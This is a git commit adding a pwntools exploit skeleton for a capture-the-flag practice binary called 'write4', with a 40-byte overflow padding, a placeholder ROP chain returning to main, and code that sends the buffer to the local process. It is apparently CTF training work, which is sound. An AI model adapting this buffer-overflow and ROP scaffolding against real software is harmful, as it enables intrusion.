2c49bf5e91b14c429fc59a7040443277c95e5c0c
Lucas Polidori <92409632+Polidori-112@users.noreply.github.com>
2023-10-22 21:52:46 -0400

    bug fixes

---
+++ chal3/xplt.py
@@ -0,0 +1,42 @@
+from pwn import *
+import os
+import struct
+
+# Cyclic Sequence: aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
+
+gdbcmds = '''
+break main
+conti
+'''
+
+challName = 'write4'
+
+# allows debugging after payload deployed
+proc = gdb.debug('./' + challName, gdbscript=gdbcmds)
+# exits program after payload deployed
+# proc = process('./' + challName)
+
+# useful for later challenges
+elf = context.binary = ELF(challName)
+
+# List your addresses here
+main = 0x00400607
+
+
+# Offset to be used to reach rip
+padding = b'B' * 40
+ropChain = b''
+
+# Construct ROP chain here
+
+ropChain += struct.pack('<Q', main)
+
+
+
+
+# Deploy ROP chain
+buf = padding + ropChain
+
+proc.recvuntil(b'>')
+proc.send(buf) 
+proc.interactive()
